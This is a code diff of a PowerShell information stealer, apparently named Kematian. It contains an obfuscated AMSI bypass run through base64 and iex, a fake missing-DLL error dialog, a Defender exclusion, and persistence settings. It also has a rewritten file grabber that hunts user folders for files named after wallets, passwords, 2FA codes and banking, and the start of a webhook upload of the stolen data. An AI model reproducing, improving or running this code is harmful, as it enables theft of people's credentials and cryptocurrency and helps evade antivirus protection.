@@ -5,7 +5,6 @@ $criticalprocess = $true
 $melt = $false
 $fakeerror = $false
 $persistence = $true
-
 $settings = $false
 
 if (Test-Path -Path "$env:APPDATA\Kematian\settings.ps1") {
@@ -28,7 +27,7 @@ $avatar = "https://i.imgur.com/DOIYOtp.gif"
 
 function KDMUTEX {
     if ($fakeerror ) { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error') }
-    $AppId = "a0e59cd1-5d22-4ae1-967b-1bf3e1d36d6b" 
+    $AppId = "a77dff94-5f71-4c3d-b0e4-952b0852179b" 
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
     if ( -not $CreatedNew ) { throw "[!] An instance of this script is already running." }
@@ -70,11 +69,12 @@ public static class ProcessUtility
 
 # Request admin with AMSI bypass
 function CHECK_AND_PATCH {
-    ${kDOt} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
-    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtkb3QuU2V0VmFsdWUoJG51bGwsJHRydWUp")) | &([regex]::Unescape("\u0069\u0065\u0078"))
-    $kdotcheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
-    return $kdotcheck
+    ${kematian} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
+    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtlbWF0aWFuLlNldFZhbHVlKCRudWxsLCR0cnVlKQ==")) | &([regex]::Unescape("\u0069\u0065\u0078"))
+    $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
+    return $kematiancheck
 }
+
 
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
@@ -754,64 +754,37 @@ Pass: $decodedPass
     #}
     #ExportPrivateKeys
 
-    Function Invoke-GrabFiles {
-        $grabber = @(
-            "2fa",
-            "acc",
-            "atomic wallet",
-            "account",
-            "backup",
-            "bank",
-            "bitcoin",
-            "backupcode",
-            "bitwarden",
-            "bitcoin",
-            "code",
-            "coinbase",
-            "crypto",
-            "dashlane",
-            "default",
-            "discord",
-            "disk",
-            "eth",
-            "exodus",
-            "facebook",
-            "fb",
-            "funds",
-            "keepass",
-            "keepassxc",
-            "keys",
-            "lastpass",
-            "login",
-            "mail",
-            "memo",
-            "metamask",
-            "note",
-            "nordpass",
-            "pass",
-            "paypal",
-            "private",
-            "pw",
-            "recovery",
-            "remote",
-            "secret",
-            "passphrase",
-            "seedphrase",
-            "wallet seed",
-            "server",
-            "syncthing",
-            "smart contract",
-            "trading",
-            "token",
-            "wal",
-            "wallet"
-        )
-        $dest = $important_files
-        $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
-        [regex] $grab_regex = "(" + (($grabber | ForEach-Object { [regex]::escape($_) }) -join "|") + ")"
-        (Get-ChildItem -path $paths -Include @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")  -r | Where-Object Length -lt 1mb) -match $grab_regex | Copy-Item -Destination $dest -Force
+    function FilesGrabber {
+    $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
+    $keywords = @("2fa","account","auth","backup","bank","bitcoin","binance","btc","backup","bitwarden","code","casino","coinbase","crypto","dashlane","discord","eth","exodus","facebook","funds","info","kraken","kucoin","keepass","keys","lastpass","login","ledger","mail","memo","mnemonic","metamask","note","nordpass","pass","paypal","pw","recovery","remote","secret","skrill","pgp","private","passphrase","seedphrase","server","solana","syncthing","trading","token","trezor","tether","venmo","wallet")
+    $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
+    foreach ($path in $paths) {
+        $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
+            $_.Length -lt 1mb -and $_.Name -match ($keywords -join '|')
+        }
+        foreach ($file in $files) {
+            $destination = Join-Path -Path $important_files -ChildPath $file.Name
+            if ($file.FullName -ne $destination) {
+                Copy-Item -Path $file.FullName -Destination $destination -Force
+            }
+        }
     }
-    Invoke-GrabFiles
+	 # Send info about the keywords that match a grabbed file
+    $keywordsUsed = @()
+    foreach ($keyword in $keywords) {
+        foreach ($file in (Get-ChildItem -Path $important_files -Recurse)) {
+            if ($file.Name -like "*$keyword*") {
+                if ($file.Length -lt 1mb) {
+                    if ($keywordsUsed -notcontains $keyword) {
+						$keywordsUsed += $keyword
+                        $keywordsUsed | Out-File "$folder_general\Important_Files_Keywords.txt" -Force
+                    }
+                }
+            }
+        }
+    }
+    }
+    FilesGrabber
 
     Set-Location "$env:LOCALAPPDATA\Temp"
 
@@ -907,7 +880,7 @@ Pass: $decodedPass
     # Send info about the data in the Kematian.zip
     function kematianinfo {	
         $messaging_sessions_info = if (Test-Path $folder_messaging) {
-            $messaging_sessions_content = Get-ChildItem -Path $folder_messaging | ForEach-Object { $_.Name -replace '\..+$' }
+            $messaging_sessions_content = Get-ChildItem -Path $folder_messaging -Directory | ForEach-Object { $_.Name -replace '\..+$' }
             if ($messaging_sessions_content) {
                 $messaging_sessions_content -join ' | '
             }
@@ -1045,7 +1018,7 @@ FileZilla: $filezilla_info
         'False'
     }
 
-	
+	Write-Host "[!] Uploading the extracted data !" -ForegroundColor Green
     $embed_and_body = @{
         "username"    = "Kematian"
         "content"     = "@everyone"
